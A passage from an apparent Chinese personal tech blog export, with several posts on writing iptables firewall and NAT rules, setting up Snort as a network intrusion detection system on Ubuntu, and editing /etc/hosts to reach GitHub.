⚠️注意要把拒绝的放在前面，不然无法起作用。 丢弃从外网接口（eth1）进入防火墙本机的源地址为私网地址的数据包 123iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROPiptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROPiptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP 私网地址范围 A类地址：10.0.0.0～10.255.255.255. B类地址：172.16.0.0 ～172.31.255.255. C类地址：192.168.0.0～192.168.255.255. 只允许管理员从202.13.0.0&#x2F;16网段使用SSH远程登录防火墙主机。 1iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT 1iptables -A INPUT -p tcp --dport 22 -j DROP SSH使用的传输层协议是TCP SSH服务开放22端口，-dport num 匹配目标端口号 允许本机开放从TCP端口20-1024提供的应用服务 1iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPT 1iptables -A OUTPUT -p tcp --sport 20:1024 -j ACCEPT 端口范围的表示方式：20-1024的表示方式，20:1024 允许开放这个范围的服务，流量不止要能进来，还要进来之后能顺利流出。所以还要制定OUTPUT链的规则。 允许转发来自192.168.0.0&#x2F;24局域网段的DNS解析请求数据包 1iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPT 1iptables -A FORWARD -d 192.168.0.0/24 -p udp --sport 53 -j ACCEPT 转发这一网段的请求，也是要求能够有进有出。 -d 和 --sport总是成对出现 DNS解析，使用的传输层协议是UDP DNS服务开放端口号是53号端口 扩展模块 iptables官方文档说明 扩展模块相关内容，章节10中详细介绍了。 比较常用的扩展： Iptables -m参数 用法： 1-m 模块关键字 扩展模块： iprange：可以指定一段连续的IP地址范围，用于匹配报文的源地址或目的地址 --src-range 匹配报文的源地址所在范围 --dst-range 匹配报文的目标地址所在范围 1iptables -t filter -I INPUT -m iprange --src-range 192.168.1.15-192.168.1.149 -j REJECT string：可以指定要匹配的字符串，如果报文中包含对应的字符串，则符合匹配条件。 如：如果报文中包含字符“hello”，就丢弃当前报文 1iptables -t filter -I INPUT -m string --algo bm --string &quot;hello&quot; -j REJECT -m string表示使用string模块，--algo bm表示使用bm算法去匹配指定的字符串，--string &quot;OOXX&quot; 则表示我们想要匹配的字符串为”hello” time： 根据时间段区匹配报文，如果报文到达的时间在指定的时间范围以内，则符合匹配条件。 比如:每天早上9点到下午6点不能看网页 1iptables -I OUTPUT -p tcp --dport 80 -m time --timestart 09:00:00 --timestop 18:00:00 -j REJECT 禁止其他主机ping防火墙主机，但是允许从防火墙上ping其他主机 1iptables -I INPUT -p icmp --icmp-type 8/0 -j REJECT 或者 1iptables -I INPUT -p icmp --icmp-type &quot;echo-request&quot; -j REJECT ping 使用的网络层协议是icmp 流量要一开始就被及时制止，所以用-I 参数，将规则添加到第一行 Icmp扩展匹配条件： icmp协议类型有很多种，都有对应的type码，每种type码又有对应的code。通常使用type/code去匹配具体类型的ICMP报文。使用--icmp-type表示根据具体的type与code去匹配对应的icmp报文。-m icmp 表示使用icmp扩展。如果已经使用了-p icmp则可以省略-m icmp 比如--icmp-type 8/0表示只有ping请求类型的报文才能被匹配到。也就是说别人对我们发起的ping请求将会被拒绝通过防火墙，而我们可以ping通别人。因为别人回应我们的报文icmp type 为0，code也为0。 除了用type code的数字表示，也可以使用文字的描述。直接填写description中的内容表述就可以了。比如 --icmp-type 8/0 可以用以下的方式表示。空格用-表示 1--icmp-type &quot;echo-request&quot; 还有udp的扩展： udp扩展，使用-sport和-dport来匹配UDP协议报文的源端口与目的端口。 比如放行samba服务的137与138两个UDP端口。 1iptables -I INPUT -p udp --dport 137 -j ACCEPT 1iptables -I INPUT -p udp --dport 138 -j ACCEPT 禁止转发来自MAC地址为00：0C：29：27：55：3F的和主机的数据包 1iptables -A FORWARD -m mac --mac-source 00：0C：29：27：55：3F -j DROP 在文档里匹配mac，找到想要的内容 ![Screen Shot 2022-07-19 at 11.30.30](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2022-07-19 at 11.30.30.png) 允许防火墙本机对外开放TCP端口20、21、25、110以及被动模式FTP端口1250-1280 1iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT 在文档里匹配TCP，找到想要的内容，其中在dport选项里提到了multiport，于是再去找multiport的扩展匹配 ![Screen Shot 2022-07-19 at 11.45.44](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2022-07-19 at 11.45.44.png) multiport扩展 ![Screen Shot 2022-07-19 at 11.50.51](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2022-07-19 at 11.50.51.png) 禁止转发源IP地址为192.168.1.20-192.168.1.99的TCP数据包 1iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP ![Screen Shot 2022-07-19 at 14.21.48](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2022-07-19 at 14.21.48.png) 禁止转发与正常TCP连接无关的非—syn请求数据包 1iptables -A FORWARD -m state --state NEW -p tcp !--syn -j DROP 这里涉及了数据包的连接状态。-m state表示数据包的连接状态，NEW表示每次新的连接开始时. 状态参数要放在前面。在选择协议的前面。 连接状态相关的扩展匹配文档 NEW means that the packet has or will start a new connection, or that it is associated with a connection that has not seen packets in both directions. 文档中，查找和syn相关的扩展匹配内容 拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包 1iptables -A INPUT -p tcp -m state --state NEW -j DROP 1iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT 这个也是和连接相关的。新数据包就是NEW新的连接。而已有连接相关的数据包，包括已经建立连接了ESTABLISHED的和新旧连接都有关系的RELATED。 NEW means that the packet has or will start a new connection, or that it is associated with a connection that has not seen packets in both directions. ESTABLISHED means that the packet is part of an already established connection that has seen packets in both directions and is fully valid. RELATED means that the packet is starting a new connection and is associated with an already established connection. 只开放本机的web服务（80）、FTP(20、21、20450-20480)，放行外部主机发住服务器其它端口的应答数据包，将其他入站数据包均予以丢弃处理 1iptables -I INPUT -p tcp -m multiport --dport 20,21,80 -j ACCEPT 1iptables -I INPUT -p tcp --dport 20450:20480 -j ACCEPT 1iptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT 1iptables -P INPUT DROP FTP是使用tcp来传输的，所以-p 的协议选用是tcp 参考链接iptables规则 iptables官方文档说明 iptables(8) - Linux man page iptables-tutorial","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"入侵检测/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"}],"author":"Gryffinbit"},{"title":"配置snort以NIDS模式运行【ubuntu ARM64系统】","slug":"配置snort以NIDS模式运行ubuntu-ARM64","date":"2022-07-19T17:40:18.000Z","updated":"2024-11-12T07:00:07.000Z","comments":true,"path":"2022/07/20/配置snort以NIDS模式运行ubuntu-ARM64/","permalink":"https://gryffinbit.top/2022/07/20/%E9%85%8D%E7%BD%AEsnort%E4%BB%A5NIDS%E6%A8%A1%E5%BC%8F%E8%BF%90%E8%A1%8Cubuntu-ARM64/","excerpt":"","text":"snort安装snort的安装跳转Blog： ubuntu【ARM架构】下安装snort【虚拟机版】 ubuntu【x86架构】下搭建snort3【云服务器版】 ubuntu系统配置相关Blog: 新系统的ubuntu基本配置 环境配置Ubuntu: Ubuntu 20.04.2 ARM64 【parallel虚拟机】 macOS: macOS Monterey. M1, 2020, ARM64【物理机】 ubuntu操作用户：在parallels普通用户下进行snort部署 snort版本：snort-2.9.20 daq-2.0.7版本：daq-2.0.7 规则集版本： 29200 Tips: 注意！规则集和snort版本要对应上，因为不同版本的可能会有一些新规则不能匹配上，就不能顺利运行。参考官网，每个新版本的说明，包括规则集的说明： 规则集 版本说明 ubuntu源：中科大arm源 snort工作模式、配置文件介绍snort工作模式、配置文件 Blog跳转链接： snort的工作模式 snort配置文件（定义、使用变量） 配置snort更新共享库 1sudo ldconfig 创建符号连接 snort被安装到 /usr/local/bin/snort 创建符号链接到 /usr/sbin/snort 1sudo ln -s /usr/local/bin/snort /usr/sbin/snort 创建snort用户 12sudo groupadd snortsudo useradd snort -r -s /sbin/nologin -c SNORT_IDS -g snort 参数说明： -r：创建一个系统账户 -s：用户登录后使用的shell名称（默认值不填写，这样系统会指定预设的登入shell，根据&#x2F;etc&#x2F;default&#x2F;useradd预设值）【sbin&#x2F;nologin 代表这个用户无法使用bash或其他shell来登陆系统，即使给了密码也不行，但是可以使用系统资源。只是不能登陆主机而已。】 -g：group名称【添加到snort组下】 -c：comment，注释说明栏 创建snort文件夹 创建snort文件夹用以存放snort配置文件 123sudo mkdir -p /etc/snort/rulessudo mkdir /var/log/snortsudo mkdir /usr/local/lib/snort_dynamicrules 给文件夹赋予权限 123456sudo chmod -R 5775 /etc/snortsudo chmod -R 5775 /var/log/snortsudo chmod -R 5775 /usr/local/lib/snort_dynamicrulessudo chown -R snort:snort /etc/snortsudo chown -R snort:snort /var/log/snortsudo chown -R snort:snort /usr/local/lib/snort_dynamicrules 775权限： root有读、写、执行权限 组用户有读、写、执行权限 其他用户有读、执行权限 读取权限 r&#x3D;4。写入权限 w&#x3D;2。执行权限 x&#x3D;1 第一个数字 ：拥有者权限（root，文件所有者） 第二个数字 ：组用户权限（与文件所有者属于同一个用户组） 第三个数字 ：其他用户权限 将这些文件的所属修改为之前创建的snort组里面的snort用户 查看文件所属 ls -l &lt;file&gt; 第一列含义： ​ 第一个字母含义： ​ 第一个字母d：意味着内容是目录或文件 ​ 如果第一个是-：意味着它的内容是文件 ​ 第一个是l：意味着内容是链接文件 ​ 后面的内容是文件所属 ​ （对应着三个数字权限775） ​ 前三个字母是文件拥有者权限 ​ 中间三个是文件所有组权限 ​ 后三个是其他人访问文件的权限 第二列含义：多少链接指向这个文件 第三列含义：谁是这个文件&#x2F;文件夹的所有者 第四列含义：谁是这个文件&#x2F;文件夹所有组 第五列含义：这个文件&#x2F;文件夹的以字节为单位的大小。目录的大小总是4096字节 第六列含义：文件最后修改时间 第七列含义：文件名或目录名 创建黑白名单和规则 123sudo touch /etc/snort/rules/white_list.rulessudo touch /etc/snort/rules/black_list.rulessudo touch /etc/snort/rules/local.rules 复制配置文件 从下载的snort-2.9.20文件夹里复制配置文件 snort-2.9.20 的路径/home/parallels/snortFile 12sudo cp ~/snortFile/snort-2.9.20/etc/*.conf* /etc/snortsudo cp ~/snortFile/snort-2.9.20/etc/*.map /etc/snort 下载snort规则集snort官网提供了三种规则集： 社区版：免费的，但是只是很简单的规则限制 注册版：免费注册后可以获得code，用code可以下载注册版规则 订阅版：需要订阅，才可以下载规则 我选择了注册版，以下都以注册版进行演示。 注册链接 oinkcode 注册成功后，会给一个oinkcode，在个人信息中可以找到 然后就可以下载规则了，将oinkcode换成自己的 1wget https://www.snort.org/rules/snortrules-snapshot-29200.tar.gz?oinkcode=oinkcode -O ~/registered.tar.gz 复制规则 下载完成后，将规则解压到snort配置文件夹 /etc/snort 1sudo tar -xvf ~/registered.tar.gz -C /etc/snort 配置网络和规则已经有了配置以及规则文件，需要修改snort.conf的变量。 1sudo vim /etc/snort/snort.conf 修改snort.conf的内容 设置需要保护的ip地址 12# Setup the network addresses you are protectingipvar HOME_NET server_public_ip/24 12# Set up the external network addresses. Leave as &quot;any&quot; in most situationsipvar EXTERNAL_NET !$HOME_NET 1234# Path to your rules files (this can be a relative path)var RULE_PATH /etc/snort/rulesvar SO_RULE_PATH /etc/snort/so_rulesvar PREPROC_RULE_PATH /etc/snort/preproc_rules 123# Set the absolute path appropriatelyvar WHITE_LIST_PATH /etc/snort/rulesvar BLACK_LIST_PATH /etc/snort/rules 在setp6里，设置输出 123# unified2# Recommended for most installsoutput unified2: filename snort.log, limit 128 翻到最下面，找到规则集列表。打开local.rules的注释，以允许snort装载个性化规则集。 1include $RULE_PATH/local.rules 保存编辑:wq 测试是否能正常工作 1sudo snort -T -c /etc/snort/snort.conf 运行成功 附录：snort 文件部署路径snort安装包所在路径、相关文档 1/home/parallels/snortFile doc：snort的一些说明文档所在文件夹 snort规则文件、配置文件 1cd /etc/snort snort日志文件 1cd /var/log/snort snort运行 1/usr/local/bin/snort 参考文章snort官方配置","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"入侵检测/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"ARM架构","slug":"ARM架构","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallels虚拟机","slug":"parallels虚拟机","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"NIDS","slug":"NIDS","permalink":"https://gryffinbit.top/tags/NIDS/"}],"author":"Gryffinbit"},{"title":"使用iptables配置NAT","slug":"使用iptables配置NAT","date":"2022-07-19T12:52:50.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/07/19/使用iptables配置NAT/","permalink":"https://gryffinbit.top/2022/07/19/%E4%BD%BF%E7%94%A8iptables%E9%85%8D%E7%BD%AENAT/","excerpt":"","text":"SNAT、DNAT介绍 通过SNAT和DNAT可以使内网和外网进行相互通讯 SNAT（源地址转换）：指数据包从网卡发送出去的时候，把数据包中的源地址部分替换为指定的IP，这样接收方就认为数据包的来源是被替换的那个IP的主机【在postrouting链】【改写数据包源地址，目的地址保持不变】 DNAT（目的地址转化）：指数据包从网卡发送出去的时候，修改数据包中的目的IP，表现为如果想访问A，可是因为网关做了DNAT，把所有访问A的数据包的目的IP全部修改为B，那么实际上访问的是B。【在prerouting链】【对数据包的目的地址修改，源地址不变】 SNAT SNAT 应用场景： 多台内网机器使用同一个公网IP上网 将服务器的源IP隐藏，改成公开的IP 1iptables -t nat -A POSTROUTING -p tcp --dport 1233 -j SNAT --to 192.168.0.1 -t nat : 配置的是nat表，-t指定了nat表-A POSTROUTING：A代表的是append，增加一个POSTROUTING的chain-p tcp --dport 1233 代表的是匹配到的数据包的特征，使用tcp协议，目的端口号是1233号-j 表示的是action，该action就是进行源地址转换--to 192.168.0.1转换成192.168.0.1的源地址，源端口号不变 地址转换时数据包的情况： 若只开启路由转发，未做地址转换： 从局域网访问外网的数据包经过网关转发后其源IP地址保持不变。当外网中的主机收到这样的请求数据包后，响应数据包将无法正确返回，从而导致访问失败 开启路由转发，并设置SNAT转换： 局域网访问外网的数据包到达网关服务器时，会先进行路由选择。如果该数据包需要从外网接口eth0 向外转发，则将其源IP地址修改为网关的外网接口地址，然后发送给目标主机 优点：外网中的服务器并不知道局域网PC机的实际IP地址，中间的转换完全由网关主机完成，起到了保护内部网络的作用 SNAT策略的应用： 局域网各主机正确设置IP地址&#x2F;子网掩码 局域网各主机正确设置默认网关地址 Linux网关支持IP路由转发 DNAT DNAT 应用场景： 端口映射：对数据包进行转发到指定的地址 隐藏后端服务的真实地址，用户访问公开的地址，由NAT服务进行转发 1iptables -t nat -A PREROUTING -p tcp --dport 1233 -j DNAT --to-destination 127.0.0.1:6543 -t nat : 配置的是nat表，-t指定了nat表 -A POSTROUTING：A代表的是append，增加一个PREROUTING的chain -p tcp --dport 1233 代表的是匹配到的数据包的特征，使用tcp协议，目的端口号是1233号 -j 表示的是action，该action就是进行目标地址转换 --to-destination 127.0.0.1:6543： IP地址改成127.0.0.1，端口号改成6543 实际应用场景 场景：Server A 运行着一个服务s1，只开放的本地地址连接，开放的端口号是6543。即Server A的服务s1监听的端口是127.0.0.1：6543。本地客户端Client想连接到服务s1去，这时可以修改s1的配置文件，让其监听所有的地址。也可以使用iptables配置NAT，使得可以访问6543的端口。 解决方案1：在Server A中执行iptables -t nat -A PREROUTING -p tcp --dport 1233 -j DNAT --to-destination 127.0.0.1:6543，让连接到Server A的1233的端口转发到本地的6543端口上去，完成了NAT的映射。 模拟： step1： Server A执行 nc -l -p 6543 监听本地的6543端口 step2： Server A执行 iptables -t nat -A PREROUTING -p tcp --dport 1233 -j DNAT --to-destination 127.0.0.1:6543 进行地址映射 step3： 在Clinet 所在的机器访问Server A的1233端口，假设Server A的公网IP是22.23.34.1，nc 22.23.34.1 1233 step4: 在Client建立连接后，输入几个字符，在Server A监听的6543端口上有显示即可。 解决方案2： iptables -t nat -A PREROUTING -p tcp --dport 5000 -j REDIRECT --to-ports 6543 使用REDIRECT的action，直接将Server A的5000端口数据转发到本地的6543端口中去。​ 上述提到的两个解决方案，在本地验证是通过不了的。即Server A和Client 都是同一台机器，因为使用lo网卡的时候，是没有PREROUTING这个阶段的，如果一定要在本地进行NAT的验证。可以使用此命令：iptables -t nat -I OUTPUT -p tcp -o lo --dport 1232 -j REDIRECT --to-ports 6543 。此命令是设置了，lo网卡的数据包的目的端口是1232的时候，转发到6543端口去。使用的是OUTPUT，因此从外部访问Server A的1232端口的话，不会转发的6543端口去，一定要是本地访问本地的时候才行。 使用上述的NAT功能前，一定要先开启linux nat转发的功能：echo 1 &gt; /proc/sys/net/ipv4/ip_forward ，重启后失效，如果需要重启后还开启，需要写到&#x2F;etc&#x2F;rc.local中去 上述提到的场景，可扩展为Server A的1233端口，转发到Server B（假设地址是8.8.8.8）的6543端口中去，Server A的角色是一个跳板，只要修改一下命令：把iptables -t nat -A PREROUTING -p tcp --dport 1233 -j DNAT --to-destination 127.0.0.1:6543 改成 iptables -t nat -A PREROUTING -p tcp --dport 1233 -j DNAT --to-destination 8.8.8.8:6543 参考文章使用iptables配置NAT iptables防火墙的应用和SNAT&#x2F;DNAT策略","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"入侵检测/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"},{"name":"SNAT","slug":"SNAT","permalink":"https://gryffinbit.top/tags/SNAT/"},{"name":"DNAT","slug":"DNAT","permalink":"https://gryffinbit.top/tags/DNAT/"}],"author":"Gryffinbit"},{"title":"iptables管理和规则","slug":"iptables管理和规则","date":"2022-07-18T16:16:52.000Z","updated":"2024-11-12T06:59:37.000Z","comments":true,"path":"2022/07/19/iptables管理和规则/","permalink":"https://gryffinbit.top/2022/07/19/iptables%E7%AE%A1%E7%90%86%E5%92%8C%E8%A7%84%E5%88%99/","excerpt":"","text":"前言iptables详解跳转blog：iptables介绍 iptables策略跳转blog：iptables策略 iptables文档：iptables(8) - Linux man page iptables指南：iptables-tutorial 命令图文表示1iptables [-t 表名] 命令选项 ［链名］ ［条件匹配］ ［-j 目标动作或跳转］ Table 指定表名，可以不用特意指定表，默认使用filter表执行所有命令 filter（包过滤）、nat（网路地址转换）、mangle（包重构、修改）、raw（数据跟踪处理） command 告诉程序做什么，比如插入规则，删除规则 123456789101112131415161718192021222324252627282930-A 在指定链的末尾添加（append）一条新的规则-D 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除-I 在指定链中插入（insert）一条新的规则，默认在第一行添加-R 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换-L 列出（list）指定链中所有的规则进行查看-E 重命名用户定义的链，不改变链本身-F 清空（flush）-N 新建（new-chain）一条用户自己定义的规则链-X 删除指定表中用户自定义的规则链（delete-chain）-P 设置指定链的默认策略（policy）-Z 将所有表的所有链的字节和数据包计数器清零-n 使用数字形式（numeric）显示输出结果-v 查看规则表详细信息（verbose）的信息-V 查看版本(version)-h 获取帮助（help） 选择规则链 选择参数 1234567-p 匹配协议，如TCP、UDP、ICMP-s 匹配来源地址 IP/MASK，加！表示除去这个ip-d 匹配目标地址-i 网卡名称 匹配从这块网卡流入的数据 -o 网卡名称 匹配从这块网卡流出的数据-dport num 匹配目标端口号-sport num 匹配来源端口号 target目标动作，选择处理数据包的方式。（target必须在最后） 规则链： INPUT——进来的数据包应用此规则链中的策略 OUTPUT——外出的数据包应用此规则链中的策略 FORWARD——转发数据包时应用此规则链中的策略 PREROUTING——对数据包作路由选择前应用此链中的规则 （所有的数据包进来的时侯都先由这个链处理） POSTROUTING——对数据包作路由选择后应用此链中的规则 （所有的数据包出来的时侯都先由这个链处理） 防火墙处理数据包的方式 ACCEPT : 允许数据包通过 DROP : 直接丢弃数据包，不给任何回应信息 REJECT : 拒绝数据包通过，必要时会给数据发送端一个响应的信息。 LOG : 在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则 规则保存与恢复1iptables-save &gt; /etc/sysconfig/iptables 12service iptables save# 将规则保存在/etc/sysconfig/iptables 删除规则举例 12# 删除input链的第一条规则iptables -D INPUT 1 常用的Linux iptables规则 以下规则看一下熟悉就好了，忘记了直接用iptables --help查看 删除所有现有规则 1iptables -F 设置默认的 chain 策略 1iptables -P INPUT DROP 1iptables -P FORWARD DRO 1iptables -P OUTPUT DROP 阻止某个特定的 IP 地址 1BLOCK_THIS_IP=&quot;x.x.x.x&quot; 1iptables -A INPUT -s &quot;$BLOCK_THIS_IP&quot; -j DROP 允许全部进来的（incoming）SSH 1iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT 只允许某个特定网络进来的 SSH 1iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT 允许进来的（incoming）HTTP 1iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT 多端口（允许进来的 SSH、HTTP 和 HTTPS） 1iptables -A INPUT -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT 允许出去的（outgoing）SSH 1iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT 允许外出的（outgoing）SSH，但仅访问某个特定的网络 1iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT 允许外出的（outgoing） HTTPS 1iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A INPUT -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT 对进来的 HTTPS 流量做负载均衡 1iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443 1iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443 1iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443 从内部向外部 Ping 1iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT 1iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT 从外部向内部 Ping 1iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT 1iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT 允许环回（loopback）访问 1iptables -A INPUT -i lo -j ACCEPT 1iptables -A OUTPUT -o lo -j ACCEPT 允许 packets 从内网访问外网 1if eth1 is connected to external network (internet) 1if eth0 is connected to internal network (192.168.1.x) 1iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT 允许外出的 DNS 1iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT 1iptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT 允许 NIS 连接 12345678910111213rpcinfo -p | grep ypbind ; This port is 853 and 850iptables -A INPUT -p tcp --dport 111 -j ACCEPTiptables -A INPUT -p udp --dport 111 -j ACCEPTiptables -A INPUT -p tcp --dport 853 -j ACCEPTiptables -A INPUT -p udp --dport 853 -j ACCEPTiptables -A INPUT -p tcp --dport 850 -j ACCEPTiptables -A INPUT -p udp --dport 850 -j ACCEPT 允许某个特定网络 rsync 进入本机 1iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT 仅允许来自某个特定网络的 MySQL 的链接 1iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT 允许 Sendmail 或 Postfix 1iptables -A INPUT -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT 允许 IMAP 和 IMAPS 1234567iptables -A INPUT -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPTiptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPTiptables -A INPUT -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPTiptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT 允许 POP3 和 POP3S 1234567iptables -A INPUT -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPTiptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPTiptables -A INPUT -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPTiptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT 防止 DoS 攻击 1iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT 设置 422 端口转发到 22 端口 1iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22 1iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT 1iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT 为丢弃的包做日志（Log） 1234567iptables -N LOGGINGiptables -A INPUT -j LOGGINGiptables -A LOGGING -m limit --limit 2/min -j LOG --log-prefix &quot;IPTables Packet Dropped: &quot; --log-level 7iptables -A LOGGING -j DROP 参考链接iptables规则 iptables官方文档说明 iptables(8) - Linux man page iptables-tutorial","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"入侵检测/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"}],"author":"Gryffinbit"},{"title":"ping github超时","slug":"github超时","date":"2022-07-18T05:02:03.000Z","updated":"2024-11-12T06:59:43.000Z","comments":true,"path":"2022/07/18/github超时/","permalink":"https://gryffinbit.top/2022/07/18/github%E8%B6%85%E6%97%B6/","excerpt":"","text":"今天连接到公司的网之后，上传blog，发现一直传不上去。开始以为是网络环境不好，几次之后还是不好，于是怀疑是GitHub出问题。 ping GitHub.com 报错连接超时。于是怀疑是：本地DNS无法解析导致的。 1sudo vim /etc/hosts 在最后一行添加 12192.30.255.112 github.com git 185.31.16.184 github.global.ssl.fastly.net 最后可以成功访问github，上传blog。 1ping github.com","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"https://gryffinbit.top/tags/GitHub/"}],"author":"Gryffinbit"},{"title":"ubuntu【x86架构】下搭建snort3【云服务器版】","slug":"ubuntu下搭建snort【云服务器版】","date":"2022-07-17T15:48:56.000Z","updated":"2024-11-12T06:59:08.000Z","comments":true,"path":"2022/07/17/ubuntu下搭建snort【云服务器版】/","permalink":"https://gryffinbit.top/2022/07/17/ubuntu%E4%B8%8B%E6%90%AD%E5%BB%BAsnort%E3%80%90%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%89%88%E3%80%91/","excerpt":"","text":"Tipsubuntu系统配置相关Blog: 新系统的ubuntu基本配置 环境配置ubuntu ：Ubuntu Server 20.04 LTS 64bit x86架构 物理机：macOS Monterey. M1,2020 snort版本：snort3-3.1.31.0 更新系统软件源 1sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade -y 更正时间 1sudo dpkg-reconfigure tzdata 